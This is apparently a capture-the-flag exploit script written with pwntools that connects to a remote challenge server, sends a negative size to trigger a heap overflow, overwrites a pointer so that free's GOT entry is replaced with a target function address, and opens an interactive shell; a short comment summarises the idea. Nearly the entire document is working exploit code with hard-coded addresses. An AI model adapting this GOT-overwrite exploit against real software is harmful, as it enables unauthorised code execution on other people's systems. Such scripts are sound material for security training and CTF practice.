from pwn import *

p = remote("remote.goatskin.kr",14394)

context.log_level = "debug"

payload = "A" * 4
payload += p32(0x0)
payload += p32(0x0)
payload += p32(0x0)
payload += p32(0x0)
payload += p32(0x11000000)
payload += p32(0x0804a014)
payload += p32(0x10000000)
payload2 = p32(0x080487e2)
payload2 += p32(0x0)

p.recvuntil("data:")
p.sendline("AAAA")
p.recvuntil("data:")
p.sendline("BBBB")
p.recvuntil("size:")
p.sendline("-1")
p.recvuntil("data:")
p.sendline(payload)
p.recvuntil("size:")
p.sendline("6")
p.recvuntil("data:")
p.sendline(payload2)

p.interactive()

"""
key idea : how to jump heap to stack?
    => where the v4 point? 
    find it and change to free got addr
    and overwrite it to exploit func addr
"""
